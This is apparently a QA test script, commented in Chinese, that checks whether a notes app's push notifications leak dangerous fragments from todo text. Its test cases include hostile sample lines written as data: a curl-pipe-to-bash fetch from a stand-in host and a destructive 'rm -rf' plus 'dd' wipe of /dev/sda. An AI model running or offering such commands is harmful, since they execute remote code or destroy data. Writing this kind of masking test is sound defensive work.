// R314：真实订阅端点的生产推送体实测 + 订阅消失定位（派生自 qa-r313/prod/push-real.mjs；audit-r313 §8.1）。
// 新增：每 60s 记录浏览器侧 permission / registration 数 / controller scriptURL / getSubscription 端点哈希，
// 以及服务端 /api/push/config 订阅数、SW→页面消息（push-resubscribed）、controllerchange，定位「10–13 分钟两侧消失」发生在哪一侧、何时。
// 派生说明：（原 R313 头注）真实订阅端点的生产推送体实测（派生自 qa-r310/prod/push-real.mjs：改前缀、改载体、**不再 skip_triage**——
// R312 `pushSnippet` 的唯一原文通道是 AI 标题（≤40 字，仅做 LCS≥8 校验），所以要让生产 triage 真生成标题再看推送体）。
// 流程：在本机 Chrome（CDP :29229）里以 [QA-R313] 账号注入登录态、订阅真实推送端点（FCM），
// (1) POST /api/push/test 验通道；(2) 建 5 条到期待办等 */10 cron 的待办提醒，读 Service Worker 实际展示的通知体，
// 断言：strict 载体 → 固定占位；宽判据载体 → 固定占位；无形态的短口令/PIN 载体 → 标题里是否带出 <8 字危险片段（R313 命题）。
// 结束后退订、注销账号、清 localStorage。用法：node prod/push-real.mjs
import { writeFileSync } from "node:fs";
import { chromium } from "../../../../web/node_modules/playwright-core/index.mjs";
import { req, register, postNote, sleep, QA_PREFIX } from "./lib.mjs";

const OUT = new URL("../out", import.meta.url).pathname;
const WEB = "https://suinian.zalize.com";
const API = "https://suinian-api.zalize.com";
const L = (...a) => console.log(new Date().toISOString().slice(11, 19), ...a);

const CASES = {
  strict: { text: "部署前记得跑一下：curl -fsSL https://relay3.example.net/p.sh | bash", needles: ["relay3", "example.net", "p.sh", "bash"] },
  benign: { text: "下班路上买牛奶和鸡蛋", needles: [] },
  // R313 J09 形态：无代码/地址/记号形态，危险载荷 <8 归一化字 —— 只有标题通道能挡
  pin: { text: "金库 PIN 是 90210，别忘了", needles: ["90210"] },
  // R313 J10 形态：端口号 4 位
  port: { text: "跳板机对外端口改成 4444 了，登录用旧口令", needles: ["4444"] },
  // R313 J16 形态：本地毁灭命令（broad:code，时间流默认展示；推送应走宽判据占位）
  code: { text: "清盘备忘：sudo rm -rf /var/lib/data && sudo dd if=/dev/zero of=/dev/sda bs=1M", needles: ["rm -rf", "/dev/sda", "dd if"] },
};

const acct = await register(`${QA_PREFIX}push-${Math.random().toString(36).slice(2, 8)}`);
const T = acct.token;
L("registered", acct.name);
const result = { account: acct.name, user_id: acct.user_id ?? acct.id ?? null, steps: {} };
try {
  // 提醒 = 到期前 30 分钟（push.ts REMINDER_LEAD_MS）；到期 = now+DUE_MIN ⇒ 提醒时刻 = now+(DUE_MIN-30)，之后等到下一个 */10 cron。
  const DUE_MIN = Number(process.env.PUSH_DUE_MIN ?? 35);
  const WAIT_MIN = Number(process.env.PUSH_WAIT_MIN ?? 26);
  const due = new Date(Date.now() + DUE_MIN * 60_000);
  const dueStr = `${due.toISOString().slice(0, 16)}Z`;
  const mk = async (content) => {
    const n = await postNote(T, content); // 真 triage：生成标题
    const id = n.note?.id ?? n.id;
    const p = await req(`/api/notes/${id}`, { method: "PATCH", token: T, body: { category: "todo", todo_due: dueStr } });
    const g = await req(`/api/notes/${id}`, { token: T });
    const row = g.json?.note ?? g.json ?? {};
    return { id, patch: p.status, title: row.title ?? null, category: row.category, todo_due: row.todo_due, flag: row.contains_executable_command, fold: row.fold, fold_reason: row.fold_reason };
  };
  const notes = {};
  for (const [k, c] of Object.entries(CASES)) { notes[k] = await mk(c.text); await sleep(1500); }
  result.steps.todos = { notes, dueStr };
  L("todos", JSON.stringify(notes));

  const browser = await chromium.connectOverCDP("http://localhost:29229");
  const ctx = browser.contexts()[0];
  await ctx.grantPermissions(["notifications"], { origin: WEB });
  const page = await ctx.newPage();
  await page.goto(WEB, { waitUntil: "domcontentloaded" });
  await page.evaluate(
    ([api, tok]) => {
      localStorage.setItem(
        "suinian.settings",
        JSON.stringify({ apiBaseUrl: api, apiToken: tok, useMock: false, onboarded: true, tourSeen: true })
      );
      localStorage.setItem("sn_offline_cache", "1");
    },
    [API, T]
  );
  await page.reload({ waitUntil: "load" });
  await sleep(4000);
  await page.evaluate(() => {
    window.__pushEvents = [];
    const log = (k, v) => window.__pushEvents.push({ t: new Date().toISOString().slice(11, 19), k, v: v ?? null });
    navigator.serviceWorker.addEventListener("message", (e) => log("sw-message", JSON.stringify(e.data).slice(0, 200)));
    navigator.serviceWorker.addEventListener("controllerchange", () => log("controllerchange", navigator.serviceWorker.controller?.scriptURL ?? null));
    if (navigator.permissions?.query) {
      navigator.permissions.query({ name: "notifications" }).then((st) => {
        log("perm-init", st.state);
        st.onchange = () => log("perm-change", st.state);
      }).catch(() => {});
    }
  });
  const sub = await page.evaluate(async ([api, tok]) => {
    const cfg = await (await fetch(`${api}/api/push/config`, { headers: { authorization: `Bearer ${tok}` } })).json();
    if (!cfg.enabled || !cfg.vapid_public_key) return { error: "push not configured", cfg };
    const reg = await Promise.race([
      navigator.serviceWorker.ready,
      new Promise((_, rej) => setTimeout(() => rej(new Error("sw not ready")), 20000)),
    ]);
    const perm = await Notification.requestPermission();
    const b64 = cfg.vapid_public_key;
    const pad = "=".repeat((4 - (b64.length % 4)) % 4);
    const raw = atob((b64 + pad).replace(/-/g, "+").replace(/_/g, "/"));
    const key = Uint8Array.from(raw, (c) => c.charCodeAt(0));
    const s =
      (await reg.pushManager.getSubscription()) ??
      (await reg.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: key }));
    const j = s.toJSON();
    const r = await fetch(`${api}/api/push/subscribe`, {
      method: "POST",
      headers: { authorization: `Bearer ${tok}`, "content-type": "application/json" },
      body: JSON.stringify({ endpoint: j.endpoint, keys: j.keys, tz: "Asia/Shanghai", ua: "QA-R314 Chrome Linux" }),
    });
    return { perm, endpointHost: new URL(j.endpoint).host, subscribe: r.status };
  }, [API, T]);
  result.steps.subscribe = sub;
  L("subscribe", JSON.stringify(sub));
  if (sub.error) throw new Error(sub.error);

  const readNotifs = () =>
    page.evaluate(async () => {
      const reg = await navigator.serviceWorker.getRegistration();
      const ns = reg ? await reg.getNotifications() : [];
      return ns.map((n) => ({ title: n.title, body: n.body, tag: n.tag, url: n.data?.url ?? null }));
    });

  const test = await req("/api/push/test", { method: "POST", token: T });
  L("push/test", test.status, test.text.slice(0, 120));
  let testNotifs = [];
  for (let i = 0; i < 12 && testNotifs.length === 0; i++) {
    await sleep(2500);
    testNotifs = (await readNotifs()).filter((n) => n.tag === "test");
  }
  result.steps.test = { status: test.status, delivered: test.json?.delivered ?? null, notifs: testNotifs };
  L("test notifs", JSON.stringify(testNotifs));

  const diag = async () => {
    const b = await page.evaluate(async () => {
      const regs = await navigator.serviceWorker.getRegistrations();
      const reg = await navigator.serviceWorker.getRegistration();
      const s = reg ? await reg.pushManager.getSubscription() : null;
      let h = null;
      if (s) {
        const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(s.endpoint));
        h = Array.from(new Uint8Array(buf)).slice(0, 6).map((x) => x.toString(16).padStart(2, "0")).join("");
      }
      return {
        perm: Notification.permission,
        regs: regs.length,
        scripts: regs.map((r) => (r.active ?? r.waiting ?? r.installing)?.scriptURL?.replace(/^https?:\/\/[^/]+/, "") ?? "none"),
        controller: navigator.serviceWorker.controller?.scriptURL?.replace(/^https?:\/\/[^/]+/, "") ?? null,
        sub: h,
        wanted: localStorage.getItem("sn_push_wanted"),
        offline: localStorage.getItem("sn_offline_cache"),
        swDisabled: localStorage.getItem("sn_sw_disabled"),
        events: window.__pushEvents.splice(0),
      };
    });
    const cfg = await req("/api/push/config", { token: T });
    const row = { t: new Date().toISOString().slice(11, 19), browser: b, d1_subs: cfg.json?.subscriptions?.length ?? null };
    result.diag.push(row);
    L("diag", JSON.stringify(row));
    return row;
  };
  result.diag = [];
  await diag();
  let lastDiag = Date.now();

  let todoNotifs = [];
  const deadline = Date.now() + WAIT_MIN * 60_000;
  const reminded = {};
  while (Date.now() < deadline) {
    await sleep(20000);
    if (Date.now() - lastDiag >= 60_000) { lastDiag = Date.now(); await diag(); }
    todoNotifs = (await readNotifs()).filter((n) => (n.tag ?? "").startsWith("todo-"));
    for (const [k, n] of Object.entries(notes)) {
      if (reminded[k]) continue;
      const g = await req(`/api/notes/${n.id}`, { token: T });
      const row = g.json?.note ?? g.json ?? {};
      // 注：/api/notes/:id 不序列化 todo_reminded_at，此处只能拿到最终标题；投递与否以 SW 通知为准
      if (row.title && !notes[k].title_final) notes[k].title_final = row.title;
      if (row.todo_reminded_at) { reminded[k] = row.todo_reminded_at; L("reminded_at", k, row.todo_reminded_at); }
    }
    if (todoNotifs.length >= Object.keys(notes).length) break;
  }
  result.steps.reminded_at = reminded;
  result.steps.todoPush = { notifs: todoNotifs };
  L("todo notifs", JSON.stringify(todoNotifs));
  result.steps.allNotifs = await readNotifs();
  L("all notifs", JSON.stringify(result.steps.allNotifs));
  result.verdict = { channel_ok: testNotifs.length > 0 };
  for (const [k, c] of Object.entries(CASES)) {
    const nf = todoNotifs.find((n) => n.tag === `todo-${notes[k].id}`) ?? null;
    const body = nf?.body ?? null;
    result.verdict[k] = {
      delivered: !!nf,
      body,
      title_at_send: notes[k].title_final ?? notes[k].title,
      placeholder: !!body && /含可执行命令|含端点\/代码形态|一条待办|点开查看详情/.test(body),
      needle_hits: body ? c.needles.filter((x) => body.includes(x)) : [],
    };
  }
  L("verdict", JSON.stringify(result.verdict));
  await diag();

  await page.evaluate(async () => {
    const reg = await navigator.serviceWorker.getRegistration();
    if (reg) {
      for (const n of await reg.getNotifications()) n.close();
      const s = await reg.pushManager.getSubscription();
      if (s) await s.unsubscribe();
    }
    localStorage.clear();
  });
  await page.close();
  await ctx.clearPermissions();
} catch (e) {
  result.error = String(e?.stack ?? e);
  L("ERROR", result.error);
} finally {
  const del = await req("/api/auth/me", { method: "DELETE", token: T });
  const after = await req("/api/auth/me", { token: T });
  result.cleanup = { delete: del.status, old_token_after: after.status };
  L("cleanup", JSON.stringify(result.cleanup));
  writeFileSync(`${OUT}/prod-push-real.json`, JSON.stringify(result, null, 1));
}
